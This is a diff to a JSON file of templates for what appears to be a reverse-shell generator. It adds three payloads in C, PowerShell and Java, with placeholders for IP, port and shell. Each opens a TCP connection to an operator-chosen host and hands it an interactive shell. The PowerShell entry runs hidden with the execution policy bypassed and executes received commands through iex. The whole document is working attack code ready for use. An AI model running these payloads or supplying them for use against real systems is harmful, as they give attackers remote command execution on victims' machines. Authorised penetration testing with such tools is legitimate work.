@@ -52,5 +52,35 @@
         "sub_components": [
             "IP", "PORT", "SHELL"
         ]
+    },
+    {
+        "name": "c",
+        "command": "#include <stdio.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\nint main(void){\n\tint port = {SUBPORT};\n\tstruct sockaddr_in revsockaddr;\n\tint sockt = socket(AF_INET, SOCK_STREAM, 0);\n\trevsockaddr.sin_family = AF_INET;\n\trevsockaddr.sin_port = htons(port);\n\trevsockaddr.sin_addr.s_addr = inet_addr(\"{SUBIP}\");\n\tconnect(sockt, (struct sockaddr *) &revsockaddr, \n\tsizeof(revsockaddr));\n\tdup2(sockt, 0);\n\tdup2(sockt, 1);\n\tdup2(sockt, 2);\n\tchar * const argv[] = {\"{SUBSHELL}\", NULL};\n\texecve(\"{SUBSHELL}\", argv, NULL);\n\treturn 0;\n}",
+        "os_support": [
+            "linux"
+        ],
+        "sub_components": [
+            "IP", "PORT", "SHELL"
+        ]
+    },
+    {
+        "name": "powershell",
+        "command": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{SUBIP}\",{SUBPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
+        "os_support": [
+            "windows"
+        ],
+        "sub_components": [
+            "IP", "PORT"
+        ]
+    },
+    {
+        "name": "java",
+        "command": "import java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class shell {\n\tpublic static void main(String[] args) {\n\t\tString host = \"{SUBIP}\";\n\t\tint port = {SUBPORT};\n\t\tString cmd = \"{SUBSHELL}\";\n\t\ttry {\n\t\t\tProcess p = new ProcessBuilder(cmd).redirectErrorStream(true).start();\n\t\t\tSocket s = new Socket(host, port);\n\t\t\tInputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\n\t\t\tOutputStream po = p.getOutputStream(), so = s.getOutputStream();\n\t\t\twhile (!s.isClosed()) {\n\t\t\t\twhile (pi.available() > 0)\n\t\t\t\t\tso.write(pi.read());\n\t\t\t\twhile (pe.available() > 0)\n\t\t\t\t\tso.write(pe.read());\n\t\t\t\twhile (si.available() > 0)\n\t\t\t\t\tpo.write(si.read());\n\t\t\t\tso.flush();\n\t\t\t\tpo.flush();\n\t\t\t\tThread.sleep(50);\n\t\t\t\ttry {\n\t\t\t\t\tp.exitValue();\n\t\t\t\t\tbreak;\n\t\t\t\t} catch (Exception e) {}\n\t\t\t}\n\t\t\tp.destroy();\n\t\t\ts.close();\n\t\t} catch (Exception e) {}\n\t}\n}",
+        "os_support": [
+            "windows", "linux", "mac"
+        ],
+        "sub_components": [
+            "IP", "PORT", "SHELL"
+        ]
     }
 ]
